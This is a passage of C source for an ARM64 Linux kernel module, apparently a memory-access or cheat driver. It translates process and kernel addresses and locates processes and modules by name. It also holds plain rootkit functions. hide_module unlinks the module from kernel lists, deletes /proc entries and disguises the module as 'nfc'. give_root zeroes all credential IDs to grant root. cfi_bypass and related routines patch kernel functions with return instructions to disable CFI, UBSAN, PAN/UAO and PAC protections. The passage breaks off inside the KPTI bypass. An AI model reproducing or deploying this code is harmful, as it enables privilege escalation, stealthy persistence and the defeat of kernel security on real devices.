            return 0;
        pmd = __pmd(v);
        if (desc_out)
            desc_out[2] = v;
        if (pmd_none(pmd)) {
            *present_out = 0;
            return 0;
        }
    }
    if (pmd_leaf(pmd)) {
        *level_out = 1;
        *ap_out = (unsigned)((v >> 6) & 3);
        *xn_out = (unsigned)((v >> 53) & 3);
        *pa_out = (pmd_pfn(pmd) << PAGE_SHIFT) + (va & ((1UL << 21) - 1));
        return 0;
    }
    if (pmd_bad(pmd)) {
        *present_out = 0;
        return 0;
    }
    {
        pte_t *p = pte_offset_kernel(&pmd, va);
        pte_t pte;
        if (memd_safe_read64(p, &v))
            return 0;
        pte = __pte(v);
        if (desc_out)
            desc_out[3] = v;
        if (!pte_present(pte)) {
            *present_out = 0;
            return 0;
        }
        *level_out = 2;
        *ap_out = (unsigned)((v >> 6) & 3);
        *xn_out = (unsigned)((v >> 53) & 3);
        *pa_out = (pte_pfn(pte) << PAGE_SHIFT) + (va & (PAGE_SIZE - 1));
        return 0;
    }
}

static uintptr_t kaddr_to_phy_addr(uintptr_t va)
 {
    unsigned long ttbr, base, v;
    pgd_t pgd;
    p4d_t p4d;
    pud_t pud;
    pmd_t pmd;
    pte_t pte;
    p4d_t *p4dp;
    pud_t *pudp;
    pmd_t *pmdp;
    pte_t *ptep;

    ttbr = read_sysreg(ttbr1_el1);
    base = ttbr & 0x0000FFFFFFFFF000UL;
    if (!base)
        return 0;
    if (memd_safe_read64(phys_to_virt(base + (unsigned long)pgd_index(va) * 8), &v))
        return 0;
    pgd = __pgd(v);
    if (pgd_none(pgd) || pgd_bad(pgd))
        return 0;
    p4dp = p4d_offset(&pgd, va);
    if (memd_safe_read64(p4dp, &v))
        return 0;
    p4d = __p4d(v);
    if (p4d_none(p4d) || p4d_bad(p4d))
        return 0;
    pudp = pud_offset(&p4d, va);
    if (memd_safe_read64(pudp, &v))
        return 0;
    pud = __pud(v);
    if (pud_none(pud))
        return 0;
    if (pud_leaf(pud))
        return (pud_pfn(pud) << PAGE_SHIFT) + (va & ((1UL << 30) - 1));
    if (pud_bad(pud))
        return 0;
    pmdp = pmd_offset(&pud, va);
    if (memd_safe_read64(pmdp, &v))
        return 0;
    pmd = __pmd(v);
    if (pmd_none(pmd))
        return 0;
    if (pmd_leaf(pmd))
        return (pmd_pfn(pmd) << PAGE_SHIFT) + (va & ((1UL << 21) - 1));
    if (pmd_bad(pmd))
        return 0;
    ptep = pte_offset_kernel(&pmd, va);
    if (memd_safe_read64(ptep, &v))
        return 0;
    pte = __pte(v);
    if (!pte_present(pte))
        return 0;
    return (pte_pfn(pte) << PAGE_SHIFT) + (va & (PAGE_SIZE - 1));
}

int translate_process_vaddr(pid_t pid, uintptr_t vaddr, uintptr_t* paddr_out) {
    struct pid* pid_struct;
    struct task_struct* task;
    struct mm_struct* mm;
    uintptr_t paddr;

    /* Canonical-high addresses are kernel VAs on every VA_BITS config:
     * walk swapper directly (pid is irrelevant, no task touched).
     * Priv-gated: kernel memory reads defeat KASLR for any local
     * process, so non-root gets nothing here (user reads unaffected).
     * Capability semantics (including cap>=32) are defined solely by
     * memd_capable — see memd_learn.h, not restated here. Every
     * in-tree call site passes a cap < 32 (SYS_ADMIN/KILL/
     * NET_BIND_SERVICE). */
    if ((long)vaddr < 0) {
        if (!memd_capable(CAP_SYS_ADMIN))
            return -EPERM;
        paddr = kaddr_to_phy_addr(vaddr);
        /* Sanity bounds BEFORE pfn_valid: a garbage walk result used as
         * a pfn array index faults unguarded (oops->panic), and a
         * garbage phys in MMIO space can raise Synchronous External
         * Abort (not extable-fixable -> silent reboot). DRAM on all
         * targets lives at/above 0x40000000 (QEMU) or 0x80000000
         * (Samsung); MMIO sits below; nothing real exceeds 64GB.
         * Anything outside is walk garbage: refuse cleanly. */
        if (!paddr || paddr < 0x40000000UL || paddr >= (64UL << 30))
            return -EFAULT;
        memd_info("kread: va=%lx -> pa=%lx\n", vaddr, paddr);
        *paddr_out = paddr;
        return 0;
    }

    pid_struct = find_get_pid(pid);
    if (!pid_struct) {
        memd_warn("failed to find pid_struct: %d\n", pid);
        return -ESRCH;
    }

    task = get_pid_task(pid_struct, PIDTYPE_PID);
    put_pid(pid_struct);
    if (!task) {
        memd_warn("failed to get task: %d\n", pid);
        return -ESRCH;
    }

    mm = get_task_mm(task);
    if (!mm) {
        memd_warn("failed to get mm: %d\n", pid);
        put_task_struct(task);
        return -ESRCH;
    }

    paddr = vaddr_to_phy_addr(mm, vaddr);

    mmput(mm);
    put_task_struct(task);

    if (paddr == 0) {
        return -EFAULT;
    }

    *paddr_out = paddr;
    return 0;
}

uintptr_t get_module_base(pid_t pid, char* name, int vm_flag) {
    struct pid* pid_struct;
    struct task_struct* task;
    struct mm_struct* mm;
    struct vm_area_struct* vma;
    unsigned long addr;
    uintptr_t result;
    struct dentry* dentry;
    size_t name_len, dname_len;

    result = 0;

    if (!name) {
        memd_err("module name is empty\n");
        return 0;
    }
    name_len = strlen(name);
    if (name_len == 0) {
        memd_err("module name is empty\n");
        return 0;
    }

    pid_struct = find_get_pid(pid);
    if (!pid_struct) {
        memd_err("failed to find pid_struct\n");
        return 0;
    }

    task = get_pid_task(pid_struct, PIDTYPE_PID);
    put_pid(pid_struct);
    if (!task) {
        memd_err("failed to get task from pid_struct\n");
        return 0;
    }

    mm = get_task_mm(task);
    put_task_struct(task);
    if (!mm) {
        memd_err("failed to get mm from task\n");
        return 0;
    }
    memd_learn_vma_once();

    /* no mmap_lock: universal image (offset varies); mm pinned + fail-closed walk */

    /* find_vma() is stable + exported on 5.10 through 6.12 (list walk
     * below, maple walk above): mm->mmap / vma_iterator would pin the
     * image to one side of 6.1. The name differs by generation
     * (find_vma vs __find_vma): resolved at runtime via memd_find_vma()
     * (on failure, NULL is returned and the loop terminates). */
    {
        for (addr = 0; (vma = memd_find_vma(mm, addr)) != NULL;
             addr = memd_v_end(vma)) {
            if (addr >= memd_v_end(vma))
                break; /* wrapped or stuck: never spin */
        {
            unsigned long _vf = memd_v_file(vma);
            if (!_vf)
                continue;
            if (vm_flag && !(memd_v_flags(vma) & vm_flag)) {
                continue;
            }
            dentry = memd_file_dentry((struct file *)_vf);
            if (!dentry ||
                ((unsigned long)dentry & 0xffff000000000000UL) !=
                0xffff000000000000UL)
                continue;
            /* Guarded qstr: dentry derives from a possibly-torn vma (no
             * mmap_lock by design); raw d_name reads would oops. qstr
             * head is {hash,len}+name, len the high u32; same
             * min-length prefix semantics as the old memcmp, compared
             * through guarded 8-byte windows (in-range bytes only). */
            {
                unsigned long hl = 0, nm = 0, i;
                size_t cmp;
                int match = 1;
                if (memd_safe_read64(&dentry->d_name, &hl) ||
                    memd_safe_read64((const char *)&dentry->d_name + 8, &nm))
                    continue;
                dname_len = (size_t)((hl >> 32) & 0xffffffffUL);
                if (!nm || (nm & 0xffff000000000000UL) != 0xffff000000000000UL)
                    continue;
                cmp = name_len < dname_len ? name_len : dname_len;
                for (i = 0; i < cmp; i += 8) {
                    unsigned long w = 0;
                    int t;
                    if (memd_safe_read64((const char *)nm + i, &w)) {
                        match = 0;
                        break;
                    }
                    for (t = 0; t < 8 && i + (size_t)t < cmp; t++) {
                        if ((char)((w >> (8 * t)) & 0xff) != name[i + t]) {
                            match = 0;
                            break;
                        }
                    }
                    if (!match)
                        break;
                }
                if (!match)
                    continue;
                result = memd_v_start(vma);
                goto ret;
            }
        }
    }
    }

ret:
    /* no mmap_lock: universal image (offset varies); mm pinned + fail-closed walk */

    mmput(mm);
    return result;
}

int is_pid_alive(pid_t pid) {
    struct pid* pid_struct;
    struct task_struct* task;
    int alive;

    pid_struct = find_get_pid(pid);
    if (!pid_struct)
        return false;

    /* pid_task() needs rcu_read_lock and pins nothing; every other site
     * here uses the refcounted get_pid_task() instead (safe without the
     * lock, task pinned). This also drops the pid ref the old code
     * leaked on all paths. */
    task = get_pid_task(pid_struct, PIDTYPE_PID);
    put_pid(pid_struct);
    if (!task)
        return false;

    alive = pid_alive(task);
    put_task_struct(task);
    return alive;
}

/* Single find_process_by_name: get_cmdline via runtime kallsyms
 * (6.1+ kernels), transparent fallback to get_cmdline_ex below.
 * Two phases: snapshot pinned tasks under RCU using plain pointer
 * reads only, then run get_cmdline/access_process_vm (both may sleep)
 * on pinned tasks with no locks held. Sleeping inside rcu_read_lock()
 * would stall grace periods and trip lockdep; the old single-pass loop
 * did exactly that. */
static int get_cmdline_ex(struct task_struct *task, char *buffer, int buflen);
pid_t find_process_by_name(const char* name) {
    struct task_struct* task;
    char cmdline[256];
    char tcomm[16] = {0};
    char* prog_name;
    char* space;
    char* slash;
    size_t name_len;
    int ret;
    int ntask;
    int i;
    int j;
    pid_t _p;
    struct task_struct **tasks;
    int (*get_cmd)(struct task_struct*, char*, int);
    static int (*my_get_cmdline)(struct task_struct* task, char* buffer, int buflen) = NULL;

    /* Fail closed as "not found": the caller treats only 0 as miss, so a negative pid would escape as a bogus success. */
    if (!name) {
        memd_err("process name is empty\n");
        return 0;
    }
    name_len = strlen(name);
    if (name_len == 0) {
        memd_err("process name is empty\n");
        return 0;
    }

    get_cmd = READ_ONCE(my_get_cmdline);
    if (!get_cmd) {
        get_cmd = (void*)kallsyms_lookup_name_ex("get_cmdline");
        if (get_cmd) {
            WRITE_ONCE(my_get_cmdline, get_cmd);
        } else {
            /* pre-6.1 (or restricted) kernels: read argv the slow way.
             * Not cached: a later bootstrap may still resolve it. */
            get_cmd = get_cmdline_ex;
        }
    }

    /* Phase 1: snapshot pinned tasks under RCU using plain pointer
     * reads only, then run get_cmdline/access_process_vm (both may
     * sleep) on pinned tasks with no locks held. Sleeping inside
     * rcu_read_lock() would stall grace periods and trip lockdep; the
     * old single-pass loop did exactly that. Tasks (not pids) are
     * pinned so a pid recycled between snapshot and lookup can never
     * substitute a different task: order and identity match the old
     * loop exactly. */
    ntask = 0;
    rcu_read_lock();
    for_each_process(task) {
        if (memd_t_mm_null(task)) {
            continue;
        }
        ntask++;
    }
    rcu_read_unlock();
    if (ntask <= 0) {
        return 0;
    }
    tasks = kmalloc((size_t)ntask * sizeof(*tasks), GFP_KERNEL);
    if (!tasks) {
        return 0;
    }
    rcu_read_lock();
    i = 0;
    for_each_process(task) {
        if (memd_t_mm_null(task)) {
            continue;
        }
        if (i < ntask) {
            tasks[i] = get_task_struct(task);
            i++;
        }
    }
    rcu_read_unlock();
    ntask = i;

    /* Phase 2: slow reads on pinned tasks (may sleep, no locks held).
     * Per-task order matches the old loop: cmdline basename first,
     * task->comm fallback only when the cmdline read fails. Exited
     * tasks simply resolve to NULL and are skipped. */
    for (i = 0; i < ntask; i++) {
        task = tasks[i];
        cmdline[0] = '\0';
        ret = get_cmd(task, cmdline, sizeof(cmdline));
        if (ret < 0) {
            // 回退到task->comm，确保完全匹配
            memd_t_comm(task, tcomm, sizeof(tcomm));
            if (strlen(tcomm) == name_len && strncmp(tcomm, name, name_len) == 0) {
                _p = memd_t_pid(task);
                put_task_struct(task);
                for (j = i + 1; j < ntask; j++)
                    put_task_struct(tasks[j]);
                kfree(tasks);
                return _p;
            }
        } else {
            /* get_cmdline_ex can fill the whole buffer with no NUL
             * (argv >= 256B: len == buflen skips the NUL leg), and the
             * kernel get_cmdline path is not NUL-guaranteed either.
             * strchr/strrchr below would then run past the stack buffer
             * (and *space = '\0' would write out of bounds). Pin the
             * last byte first — same guarantee as the ioctl name paths. */
            cmdline[sizeof(cmdline) - 1] = '\0';
            // 提取程序名（第一个空格之前的部分）
            prog_name = cmdline;
            space = strchr(cmdline, ' ');
            if (space) {
                *space = '\0';
            }

            // 提取路径中的文件名部分
            slash = strrchr(prog_name, '/');
            if (slash) {
                prog_name = slash + 1;
            }

            if (strlen(prog_name) == name_len && strncmp(prog_name, name, name_len) == 0) {
                _p = memd_t_pid(task);
                put_task_struct(task);
                for (j = i + 1; j < ntask; j++)
                    put_task_struct(tasks[j]);
                kfree(tasks);
                return _p;
            }
        }
        put_task_struct(task);
    }
    kfree(tasks);
    return 0;
}

static int get_cmdline_ex(struct task_struct* task, char* buffer, int buflen) {
    int res = 0;
    unsigned int len;
    struct mm_struct* mm = get_task_mm(task);
    unsigned long arg_start, arg_end, env_start, env_end;
    if (!mm)
        goto out;
    if (!mm->arg_end)
        goto out_mm; /* Do not inspect the address before validation completes. */

    spin_lock(&mm->arg_lock);
    arg_start = mm->arg_start;
    arg_end = mm->arg_end;
    env_start = mm->env_start;
    env_end = mm->env_end;
    spin_unlock(&mm->arg_lock);

    /* Torn/empty range under a racing exec: arg_end <= arg_start
     * wraps the subtraction below into a huge len and fabricates a
     * read (mirrors the ioctl argv-fallback guard). Return 0 with the
     * buffer untouched instead of scanning user memory. */
    if (arg_end <= arg_start)
        goto out_mm;

    len = arg_end - arg_start;

    /* Reserve one byte for NUL: a full-buffer argv read must never
     * return unterminated (callers treat the buffer as a C string;
     * len == buflen skips the NUL leg below). Fail closed on tiny buflen. */
    if (buflen <= 1)
        goto out_mm;
    if (len > (unsigned int)(buflen - 1))
        len = (unsigned int)(buflen - 1);

    res = access_process_vm(task, arg_start, buffer, len, FOLL_FORCE);

    /*
     * If the nul at the end of args has been overwritten, then
     * assume application is using setproctitle(3).
     */
    if (res > 0 && buffer[res - 1] != '\0' && len < buflen) {
        len = strnlen(buffer, res);
        if (len < res) {
            res = len;
        } else {
            /* Torn env range under a racing exec: same wrap hazard
             * as argv above; skip the env leg and keep argv bytes. */
            if (env_end > env_start) {
                len = env_end - env_start;
                if (len > buflen - res)
                    len = buflen - res;
                res += access_process_vm(task, env_start, buffer + res, len, FOLL_FORCE);
            }
            res = strnlen(buffer, res);
        }
    }
    /* Contract: buffer always NUL-terminated on res > 0; res clamped
     * into the buffer so callers can use it as a length safely. */
    if (res > 0) {
        if (res >= buflen)
            res = buflen - 1;
        buffer[res] = '\0';
    }
out_mm:
    mmput(mm);
out:
    return res;
}


static struct list_head* module_previous;
static struct list_head* module_kobj_previous;
static short module_hidden = 0;

void show_module(void) {
#if defined(HIDE_SELF_MODULE)
#ifdef MODULE
    if (module_hidden) {
        list_add(&THIS_MODULE->list, &THIS_MODULE->list);
        kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "%s", THIS_MODULE->name);
        list_add(&THIS_MODULE->mkobj.kobj.entry, &THIS_MODULE->mkobj.kobj.entry);
        module_hidden = 0;
    }
#endif
#endif
}

void hide_module(void) {
#if defined(HIDE_SELF_MODULE)
    if (is_file_exist("/proc/sched_debug")) {
        remove_proc_entry("sched_debug", NULL);
    }

    if (is_file_exist("/proc/uevents_records")) {
        remove_proc_entry("uevents_records", NULL);
    }

#ifdef MODULE
    if (!module_hidden) {
        list_del(&THIS_MODULE->list);
        kobject_del(&THIS_MODULE->mkobj.kobj);
        list_del(&THIS_MODULE->mkobj.kobj.entry);
        module_hidden = 1;
    }
#endif

    strncpy(THIS_MODULE->name, "nfc", sizeof(THIS_MODULE->name) - 1);
    THIS_MODULE->name[sizeof(THIS_MODULE->name) - 1] = '\0';
#endif
}

int give_root(void) {
    struct cred* newcreds;
    struct cred* (*prep)(void);
    int (*commit)(struct cred*);
    int (*ovr)(struct cred*);
    void (*rev)(void);
    static struct cred* (*my_prepare_creds)(void) = NULL;
    static int (*my_commit_creds)(struct cred*) = NULL;
    static int (*my_override_creds)(struct cred*) = NULL;
    static void (*my_revert_creds)(void) = NULL;

    /* Retry until BOTH required entries resolve: caching a partial
     * result (prepare without commit) would call NULL next time.
     * Snapshots via locals: concurrent first-use must never call a
     * half-stored pointer. */
    prep = READ_ONCE(my_prepare_creds);
    commit = READ_ONCE(my_commit_creds);
    if (prep == NULL || commit == NULL) {
        prep = (void*)kallsyms_lookup_name_ex("prepare_creds");
        commit = (void*)kallsyms_lookup_name_ex("commit_creds");
        ovr = (void*)kallsyms_lookup_name_ex("override_creds");
        rev = (void*)kallsyms_lookup_name_ex("revert_creds");
        if (prep == NULL || commit == NULL) {
            return -ENODEV; /* resolver missing: same fail-closed code as memd_kernel_read */
        }
        WRITE_ONCE(my_prepare_creds, prep);
        WRITE_ONCE(my_commit_creds, commit);
        WRITE_ONCE(my_override_creds, ovr);
        WRITE_ONCE(my_revert_creds, rev);
    } else {
        ovr = READ_ONCE(my_override_creds);
        rev = READ_ONCE(my_revert_creds);
    }

    newcreds = prep();
    if (newcreds == NULL)
        return -ENOMEM; /* cred alloc failed, nothing committed */

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0) && defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS) || \
    LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
    newcreds->uid.val = newcreds->gid.val = 0;
    newcreds->euid.val = newcreds->egid.val = 0;
    newcreds->suid.val = newcreds->sgid.val = 0;
    newcreds->fsuid.val = newcreds->fsgid.val = 0;
#else
    newcreds->uid = newcreds->gid = 0;
    newcreds->euid = newcreds->egid = 0;
    newcreds->suid = newcreds->sgid = 0;
    newcreds->fsuid = newcreds->fsgid = 0;
#endif

    if (ovr && rev) {
        ovr(newcreds);
    } else {
        commit(newcreds);
    }

    return 0;
}

void __iomem* memd_ioremap_prot(uintptr_t phys_addr, size_t size, pgprot_t prot) {
    unsigned long offset, vaddr;
    uintptr_t last_addr;
    struct vm_struct* area;
    int (*map_range)(unsigned long, unsigned long, uintptr_t, pgprot_t);
    void (*free_area)(struct vm_struct *);
    struct vm_struct *(*a4)(unsigned long, unsigned long,
            unsigned long, unsigned long, const void *);
    struct vm_struct *(*a3)(unsigned long, unsigned long, const void *);
    int err;
    static int (*my_ioremap_page_range)(unsigned long, unsigned long,
               uintptr_t, pgprot_t) = NULL;
    static void (*my_free_vm_area)(struct vm_struct *) = NULL;

    offset = phys_addr & ~PAGE_MASK;
    /*
     * Page align the mapping address and size, taking account of any
     * offset.
     */
    phys_addr &= PAGE_MASK;
    size = PAGE_ALIGN(size + offset);

    /*
     * Don't allow wraparound, zero size or outside PHYS_MASK.
     */
    last_addr = phys_addr + size - 1;
    if (!size || last_addr < phys_addr || last_addr & ~PHYS_MASK)
        return NULL;

    map_range = READ_ONCE(my_ioremap_page_range);
    free_area = READ_ONCE(my_free_vm_area);
    /* Pair resolution with no partial caching and no loop: a single
     * attempt per call, so a helper that never resolves degrades to a
     * clean NULL every call (fail closed, never a spin/wedge). Both
     * entries publish only on joint success, so concurrent first-use
     * can never call a half-stored pointer; a miss retries next call
     * (cold path). Re-verified round 5: the claim holds. */
    if (map_range == NULL || free_area == NULL) {
        map_range = (int (*)(unsigned long addr, unsigned long end,
                   uintptr_t phys_addr, pgprot_t prot))kallsyms_lookup_name_ex("ioremap_page_range");
        free_area = (void (*)(struct vm_struct *area))kallsyms_lookup_name_ex("free_vm_area");
        if (map_range == NULL || free_area == NULL) {
            memd_err("cannot find ioremap_page_range or free_vm_area\n");
            return NULL;
        }
        WRITE_ONCE(my_ioremap_page_range, map_range);
        WRITE_ONCE(my_free_vm_area, free_area);
    }

    /* __get_vm_area_caller (6.6+) first, get_vm_area_caller (5.10+) as
     * fallback: both resolved by name at runtime, one image either way.
     * No shared "probed" latch: a racing caller must never observe
     * probed=true with both allocators still NULL. Each entry resolves
     * on its own; a miss simply retries next call (cold path). */
    {
        static struct vm_struct *(*area4)(unsigned long, unsigned long,
                unsigned long, unsigned long, const void *) = NULL;
        static struct vm_struct *(*area3)(unsigned long, unsigned long,
                const void *) = NULL;
        a4 = READ_ONCE(area4);
        if (!a4) {
            a4 = (void *)kallsyms_lookup_name_ex("__get_vm_area_caller");
            if (a4)
                WRITE_ONCE(area4, a4);
        }
        a3 = READ_ONCE(area3);
        if (!a3) {
            a3 = (void *)kallsyms_lookup_name_ex("get_vm_area_caller");
            if (a3)
                WRITE_ONCE(area3, a3);
        }
        if (a4)
            area = a4(size, VM_IOREMAP, VMALLOC_START, VMALLOC_END,
                         __builtin_return_address(0));
        else if (a3)
            area = a3(size, VM_IOREMAP, __builtin_return_address(0));
        else {
            memd_err("cannot find vm area allocator\n");
            return NULL;
        }
    }

    if (!area)
        return NULL;
    vaddr = (unsigned long)area->addr;
    area->phys_addr = phys_addr;

    err = map_range(vaddr, vaddr + size, phys_addr, prot);
    if (err) {
        free_area(area);
        return NULL;
    }

    return (void __iomem*)(vaddr + offset);
}

/* 0 = absent or already patched (nothing to do), 1 = patched, -EFAULT = guarded fault. */
static int cfi_patch_function(const char *name, unsigned int *patch, int patch_instrs)
 {
    unsigned long addr = kallsyms_lookup_name_ex(name);
    unsigned long w;
    unsigned int *p;
    int i;
    if (!addr)
        return 0;

    /* Kernel text may sit in an execute-only mapping: probe through the
     * extable guard instead of faulting on a direct load. */
    p = (unsigned int *)addr;
    if (memd_safe_read64(p, &w))
        return -EFAULT;
    if ((unsigned int)w == patch[0]) {
        memd_info("cfi: %s already patched\n", name);
        return 0;
    }

    for (i = 0; i < patch_instrs; i++) {
        if (hook_write_range(p + i, &patch[i], INSTRUCTION_SIZE)) {
            memd_err("cfi: failed to patch %s at offset %d\n", name, i);
            return -EFAULT;
        }
    }
    memd_err("cfi: patched %s (%d instructions)\n", name, patch_instrs);
    return 1;
}

static int cfi_patch_ret(const char *name)
 {
    unsigned int RET = 0xD65F03C0;
    return cfi_patch_function(name, &RET, 1);
}

static int cfi_patch_mov_x0_1_ret(const char *name)
 {
    unsigned int patch[2] = {0xD2800020, 0xD65F03C0};
    return cfi_patch_function(name, patch, 2);
}

/* Guarded single-word probe for the bespoke CFI-bypass sites below.
 * Kernel text may sit in an execute-only mapping (a direct load then
 * faults), and a stale kallsyms hit may point at unmapped garbage, so
 * no bypass site may dereference its target directly. Returns 1 when
 * the word read cleanly and differs from want (patch needed), 0
 * otherwise (already patched, or unreadable: fail closed, skip the
 * write rather than patching blind). */
static int cfi_need_patch32(unsigned int *p, unsigned int want)
 {
    unsigned int v = 0;
    if (memd_safe_read32(p, &v))
        return 0;
    return v != want;
}

/* Forward declarations: cfi_bypass() calls these before their
 * definitions below (implicit decl + later static = hard error). */
static int cfi_bypass_pan_uao(void);
static int cfi_bypass_pac(void);
static int cfi_bypass_kpti(void);
static int cfi_bypass_mte(void);
static int cfi_bypass_bti(void);

/* Best-effort count of patched sites; unpatchable entries are skipped, never fatal (symbols legitimately differ per generation). */
int cfi_bypass(void)
 {
    int ret = 0;
    int r;

    r = cfi_patch_ret("__cfi_slowpath");
    if (r > 0) ret += r;

    r = cfi_patch_ret("__cfi_slowpath_diag");
    if (r > 0) ret += r;

    r = cfi_patch_ret("_cfi_slowpath");
    if (r > 0) ret += r;

    r = cfi_patch_ret("__cfi_check_fail");
    if (r > 0) ret += r;

    r = cfi_patch_ret("__ubsan_handle_cfi_check_fail_abort");
    if (r > 0) ret += r;

    r = cfi_patch_ret("__ubsan_handle_cfi_check_fail");
    if (r > 0) ret += r;

    r = cfi_patch_mov_x0_1_ret("report_cfi_failure");
    if (r > 0) ret += r;

    r = cfi_patch_ret("cfi_slowpath");
    if (r > 0) ret += r;

    r = cfi_patch_ret("__cfi_verify");
    if (r > 0) ret += r;

    r = cfi_patch_ret("__kcfi_check_fail");
    if (r > 0) ret += r;

    r = cfi_patch_ret("kcfi_check_fail");
    if (r > 0) ret += r;

    r = cfi_patch_ret("__ubsan_handle_type_mismatch_v1");
    if (r > 0) ret += r;

    r = cfi_patch_ret("__ubsan_handle_type_mismatch");
    if (r > 0) ret += r;

    r = cfi_patch_ret("__ubsan_handle_builtin_unreachable");
    if (r > 0) ret += r;

    r = cfi_patch_ret("__ubsan_handle_pointer_overflow");
    if (r > 0) ret += r;

    r = cfi_patch_ret("__ubsan_handle_load_invalid_value");
    if (r > 0) ret += r;

    r = cfi_patch_ret("__ubsan_handle_out_of_bounds");
    if (r > 0) ret += r;

    r = cfi_patch_ret("__ubsan_handle_shift_out_of_bounds");
    if (r > 0) ret += r;

    r = cfi_patch_ret("__ubsan_handle_divrem_overflow");
    if (r > 0) ret += r;

    r = cfi_patch_ret("__ubsan_handle_mul_overflow");
    if (r > 0) ret += r;

    r = cfi_patch_ret("__ubsan_handle_negate_overflow");
    if (r > 0) ret += r;

    r = cfi_patch_ret("__ubsan_handle_float_cast_overflow");
    if (r > 0) ret += r;

    r = cfi_patch_ret("__ubsan_handle_invalid_builtin");
    if (r > 0) ret += r;

    r = cfi_patch_ret("__ubsan_handle_cfi_bad_type");
    if (r > 0) ret += r;

    r = cfi_patch_mov_x0_1_ret("kcfi_failure");
    if (r > 0) ret += r;

    r = cfi_patch_mov_x0_1_ret("kcfi_type_mismatch");
    if (r > 0) ret += r;

    r = cfi_patch_mov_x0_1_ret("kcfi_check_fail_diag");
    if (r > 0) ret += r;

    /* The remaining CFI/kcfi entry points go through the same guarded
     * shared helpers (execute-only-safe probe inside): no bespoke
     * direct reads here. */
    r = cfi_patch_ret("__kcfi_check");
    if (r > 0) ret += r;

    r = cfi_patch_mov_x0_1_ret("kcfi_typeid");
    if (r > 0) ret += r;

    r = cfi_patch_ret("kcfi_verify");
    if (r > 0) ret += r;

    r = cfi_patch_ret("kcfi_check_fail");
    if (r > 0) ret += r;

    r = cfi_patch_mov_x0_1_ret("kcfi_diag");
    if (r > 0) ret += r;

    ret += cfi_bypass_pan_uao();
    ret += cfi_bypass_pac();
    ret += cfi_bypass_kpti();
    ret += cfi_bypass_mte();
    ret += cfi_bypass_bti();

    return ret;
}

static int cfi_bypass_pan_uao(void)
 {
    int ret = 0;
    unsigned int RET = 0xD65F03C0;
    unsigned long fpan_el0;
    unsigned long fpan_el0_end;
    unsigned long fuac_el0;
    unsigned long fuac_el0_end;
    unsigned long fuser_access;
    unsigned long fuser_access_end;
    unsigned int *p;

    fpan_el0 = kallsyms_lookup_name_ex("__uaccess_begin_pan");
    if (fpan_el0) {
        p = (unsigned int *)fpan_el0;
        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
            ret++;
            memd_err("cfi: bypassed PAN (uaccess_begin)\n");
        }
    }

    fpan_el0_end = kallsyms_lookup_name_ex("__uaccess_end_pan");
    if (fpan_el0_end) {
        p = (unsigned int *)fpan_el0_end;
        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
            ret++;
            memd_err("cfi: bypassed PAN (uaccess_end)\n");
        }
    }

    fuac_el0 = kallsyms_lookup_name_ex("__uaccess_begin_uao");
    if (fuac_el0) {
        p = (unsigned int *)fuac_el0;
        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
            ret++;
            memd_err("cfi: bypassed UAO (uaccess_begin)\n");
        }
    }

    fuac_el0_end = kallsyms_lookup_name_ex("__uaccess_end_uao");
    if (fuac_el0_end) {
        p = (unsigned int *)fuac_el0_end;
        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
            ret++;
            memd_err("cfi: bypassed UAO (uaccess_end)\n");
        }
    }

    fuser_access = kallsyms_lookup_name_ex("user_access_begin");
    if (fuser_access) {
        p = (unsigned int *)fuser_access;
        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
            ret++;
            memd_err("cfi: bypassed user_access_begin\n");
        }
    }

    fuser_access_end = kallsyms_lookup_name_ex("user_access_end");
    if (fuser_access_end) {
        p = (unsigned int *)fuser_access_end;
        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
            ret++;
            memd_err("cfi: bypassed user_access_end\n");
        }
    }

    return ret;
}

static int cfi_bypass_pac(void)
 {
    int ret = 0;
    unsigned int RET = 0xD65F03C0;
    unsigned long fpac_ia;
    unsigned long fpac_ib;
    unsigned long fpac_da;
    unsigned long fpac_db;
    unsigned long fpac_generic;
    unsigned long fpac_strip;
    unsigned int *p;

    fpac_ia = kallsyms_lookup_name_ex("__pacia_el0");
    if (fpac_ia) {
        p = (unsigned int *)fpac_ia;
        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
            ret++;
            memd_err("cfi: bypassed PACIA\n");
        }
    }

    fpac_ib = kallsyms_lookup_name_ex("__pacib_el0");
    if (fpac_ib) {
        p = (unsigned int *)fpac_ib;
        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
            ret++;
            memd_err("cfi: bypassed PACIB\n");
        }
    }

    fpac_da = kallsyms_lookup_name_ex("__pacda_el0");
    if (fpac_da) {
        p = (unsigned int *)fpac_da;
        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
            ret++;
            memd_err("cfi: bypassed PACDA\n");
        }
    }

    fpac_db = kallsyms_lookup_name_ex("__pacdb_el0");
    if (fpac_db) {
        p = (unsigned int *)fpac_db;
        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
            ret++;
            memd_err("cfi: bypassed PACDB\n");
        }
    }

    fpac_generic = kallsyms_lookup_name_ex("pac_generic");
    if (fpac_generic) {
        p = (unsigned int *)fpac_generic;
        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
            ret++;
            memd_err("cfi: bypassed pac_generic\n");
        }
    }

    fpac_strip = kallsyms_lookup_name_ex("strip_pac");
    if (fpac_strip) {
        p = (unsigned int *)fpac_strip;
        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
            ret++;
            memd_err("cfi: bypassed strip_pac\n");
        }
    }

    return ret;
}

static int cfi_bypass_kpti(void)
 {
    int ret = 0;
    unsigned int RET = 0xD65F03C0;
    unsigned long fkpti_init;
    unsigned long fkpti_enable;
    unsigned long fkpti_disable;
    unsigned long fkpti_isolate;
